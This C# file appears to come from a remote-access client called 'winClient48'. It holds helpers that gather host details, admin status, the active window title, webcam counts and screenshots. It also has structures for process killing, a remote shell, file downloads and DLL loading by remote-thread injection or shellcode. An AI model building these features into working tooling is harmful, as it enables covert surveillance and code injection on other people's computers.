using System;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Web;
using System.Windows.Forms;

namespace winClient48
{
    public class Global
    {
        //GZIP
        public static byte[] Compress(byte[] abBuffer)
        {
            byte[] abData;
            using (MemoryStream ms = new MemoryStream())
            {
                using (var gzip = new GZipStream(ms, CompressionMode.Compress))
                {
                    gzip.Write(abBuffer, 0, abBuffer.Length);
                }

                abData = ms.ToArray();
            }

            return abData;
        }
        public static byte[] Decompress(byte[] abBuffer)
        {
            byte[] abData;

            using (MemoryStream ms = new MemoryStream(abBuffer))
            {
                using (var gzip = new GZipStream(ms, CompressionMode.Decompress))
                {
                    using (MemoryStream msRet = new MemoryStream())
                    {
                        gzip.CopyTo(msRet);
                        abData = msRet.ToArray();
                    }
                }
            }

            return abData;
        }

        /// <summary>
        /// Return CPU usage percentage.
        /// </summary>
        /// <returns></returns>
        public static string getCPU()
        {
            string result = "[NULL]";
            try
            {
                using (var cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total"))
                {
                    // Call NextValue() once to initialize the counter
                    cpuCounter.NextValue();
                    System.Threading.Thread.Sleep(1000); // Wait for a second to get a valid reading

                    // Get CPU usage percentage
                    float cpuUsage = cpuCounter.NextValue();
                    result = ((int)cpuUsage).ToString() + "%";
                }
            }
            catch (Exception ex)
            {

            }

            return result;
        }

        public static string getOS()
        {
            try
            {
                return WMI_QueryNoEncode("SELECT Caption FROM Win32_OperatingSystem")[0];
            }
            catch (Exception ex)
            {
                return "Unknown";
            }
        }

        /// <summary>
        /// Get active window title.
        /// </summary>
        /// <returns></returns>
        public static string GetActiveWindowTitle()
        {
            const int nChars = 512;
            StringBuilder sb = new StringBuilder(nChars);
            IntPtr handle = WinAPI.GetForegroundWindow();

            if (WinAPI.GetWindowText(handle, sb, nChars) > 0)
                return sb.ToString();
            else
                return "";
        }

        public static string[] WMI_QueryNoEncode(string query, string name = null)
        {
            List<string> result = new List<string>();
            using (var searcher = new ManagementObjectSearcher(query))
            {
                using (ManagementObjectCollection coll = searcher.Get())
                {
                    try
                    {
                        foreach (var device in coll)
                        {
                            foreach (PropertyData data in device.Properties)
                            {
                                if (string.IsNullOrEmpty(name))
                                    result.Add(device[data.Name].ToString());
                                else
                                    result.Add(device[name].ToString());
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        return null;
                    }
                }
            }

            return result.ToArray();
        }
        public static DataTable WMI_Query(string query)
        {
            DataTable dt = new DataTable();
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
            {
                using (ManagementObjectCollection col = searcher.Get())
                {
                    foreach (ManagementObject obj in col)
                    {
                        DataRow dr = dt.NewRow();
                        foreach (PropertyData prop in obj.Properties)
                        {
                            if (!dt.Columns.Contains(prop.Name))
                            {
                                dt.Columns.Add(prop.Name);
                            }

                            dr[prop.Name] = prop.Value?.ToString() ?? "N/A";
                        }

                        dt.Rows.Add(dr);
                    }
                }
            }

            return dt;
        }

        public static string BitmapToBase64(Bitmap bitmap)
        {
            try
            {
                using (MemoryStream ms = new MemoryStream())
                {
                    bitmap.Save(ms, ImageFormat.Png);
                    byte[] image_bytes = ms.ToArray();
                    return Convert.ToBase64String(image_bytes);
                }
            }
            catch
            {
                return string.Empty;
            }
        }
        public static string IconToBase64(Icon icon)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                icon.Save(ms);
                byte[] buffer = ms.ToArray();
                return Convert.ToBase64String(buffer);
            }
        }
        public static Image Base64ToImage(string szBase64String)
        {
            byte[] buffer = Convert.FromBase64String(szBase64String);
            using (MemoryStream ms = new MemoryStream(buffer))
            {
                using (Image img = Image.FromStream(ms))
                {
                    return img;
                }
            }
        }
        public static string ImageToBase64(Image img)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                img.Save(ms, ImageFormat.Png);
                byte[] buffer = ms.ToArray();
                return Convert.ToBase64String(buffer);
            }
        }
    }

    public enum ShellCtrl
    {
        CtrlC,
        CtrlZ,
    }
    public enum SendMode
    {
        RAW,
        HTTP,
    }
    public enum EntityTimestampType
    {
        CreationTime,
        LastModifiedTime,
        LastAccessedTime,
    }
    public enum ShortCutsType
    {
        File,
        URL,
    }
    public enum DllLoaderMethod
    {
        CreateRemoteThread,
        DotNetAssemblyLoad,
        ShellCode,
    }

    public struct BasicInfo
    {
        public string szOnlineID { get; set; }
        public string szUsername { get { return Dns.GetHostName(); } }
        public bool bIsAdmin 
        { 
            get 
            {
                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(identity);

                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }
        public string szOS
        {
            get
            {
                //string result = Environment.OSVersion.ToString();
                string result = null;
                try { result = Global.WMI_QueryNoEncode("select caption from Win32_OperatingSystem")[0]; } catch { }
                if (result == null)
                    try { result = RuntimeInformation.OSDescription; } catch { }
                if (result == null)
                    try { result = Environment.OSVersion.VersionString; } catch { }

                return result;
            }
        }
        public int dwPing;
        public string szCPU => Global.getCPU();
        public int dwMonitorCount => Screen.AllScreens.Length;
        public int dwWebcamCount => new Webcam().GetDevices().Count;
        public string szActiveWindowTitle;
        public Image imgScreenshot;
    }
    public struct ClientConfig
    {
        public string szOnlineID;

        public int dwTimeout;
        public int dwSendInfo;
        public int dwRetry;

        public List<string> ls_szKillProcess;
        public bool bKillProcess;
    }
    public struct ClientInfo
    {
        public string szDnsHostName => Dns.GetHostName();
        public string szStartupPath => Application.StartupPath;
        public string szCurrentProcName => Process.GetCurrentProcess().ProcessName;
        public string szMachineName => Environment.MachineName;
        public string szUsername => Environment.UserName;
        public string szUserDomainName => Environment.UserDomainName;
        public string szOS => new BasicInfo().szOS;

        /* Key: Monitor name
         * Value: Monitor rectangle(size) */
        private Dictionary<string, Rectangle> _ls_Monitor;

        public Dictionary<string, Rectangle> ls_Monitor
        {
            get
            {
                if (_ls_Monitor == null)
                {
                    _ls_Monitor = new Dictionary<string, Rectangle>();
                }

                _ls_Monitor.Clear();

                foreach (Screen screen in Screen.AllScreens)
                {
                    _ls_Monitor[screen.DeviceName] = screen.WorkingArea;
                }

                return _ls_Monitor;
            }
        }

        /* Key: Webcam name
         * Value: Webcam rectangle(size) */

        public List<string> ls_Webcam => new Webcam().GetDevices();
    }
    public struct WindowInfo
    {
        public string szTitle;
        public string szProcessName;
        public string szFilePath;
        public int nProcessId;
        public int nHandle;
        public Icon iWindow;
    }
    public struct WgetStatus
    {
        public string szUrl;
        public string szLocalFileName;
        public int nCode;
        public string szMsg;
    }
}
